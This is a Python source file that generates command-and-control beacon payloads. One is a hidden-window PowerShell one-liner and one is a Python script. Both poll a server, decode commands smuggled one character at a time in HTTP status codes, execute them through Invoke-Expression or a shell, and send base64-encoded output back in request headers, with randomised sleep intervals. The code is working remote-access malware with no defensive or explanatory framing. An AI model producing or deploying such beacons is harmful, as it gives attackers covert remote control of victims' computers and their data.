import socket

def generate_http_cmd(server_url="http://127.0.0.1:8000"):
    windows_beacon = '''
    powershell -w hidden -Command "$S=\\"SERVER_URL\\";$B=\\"\\";$G=\\"w-\\"+[guid]::NewGuid().ToString();while($true){try{$C=[int](Invoke-WebRequest \\"$S/poll\\" -UseBasicParsing -Headers @{\\"X-Client\\"=$G} -ErrorAction Stop).StatusCode}catch{try{$C=$_.Exception.Response.StatusCode.Value__}catch{$C=0}};if($C-ge 200 -and $C-le 326){$x=$C-200;if($x-eq 10){try{$R=Invoke-Expression $B|Out-String}catch{$R=$_|Out-String};$E=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($R.Trim()));$r=[System.Net.WebRequest]::Create(\\"$S/poll\\");$r.Method=\\"GET\\";$r.Headers.Add(\\"X-Output\\",$E);$r.Headers.Add(\\"X-Client\\",$G);try{$r.GetResponse().Close()}catch{};$B=\\"\\"}elseif($x-ge 32 -and $x-le 126){$B+=[char]$x}};Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 3500)}"
    '''.replace("SERVER_URL", server_url)
    return windows_beacon

def generate_http_python(server_url="http://127.0.0.1:8000"):
    python_beacon = '''
import subprocess, requests, time, base64, uuid, random, platform

server = "SERVER_URL"
tag = "l"
if platform.system() == "Darwin":
    tag = "m"
elif platform.system() == "Windows":
    tag = "w"
client_id = f"{tag}-{uuid.uuid4()}"
buf = ""

while True:
    try:
        r = requests.get(f"{server}/poll", headers={"X-Client": client_id})
        code = r.status_code
    except requests.exceptions.RequestException as e:
        try:
            code = e.response.status_code
        except:
            code = 0

    if 200 <= code <= 326:
        ch = code - 200
        if ch == 10:
            try:
                result = subprocess.check_output(buf, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            encoded = base64.b64encode(result.strip().encode()).decode()
            try:
                requests.get(f"{server}/poll", headers={"X-Client": client_id, "X-Output": encoded})
            except:
                pass
            buf = ""
        elif 32 <= ch <= 126:
            buf += chr(ch)

    time.sleep(random.uniform(0.5, 1.5))
'''.replace("SERVER_URL", server_url)
    return python_beacon

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"
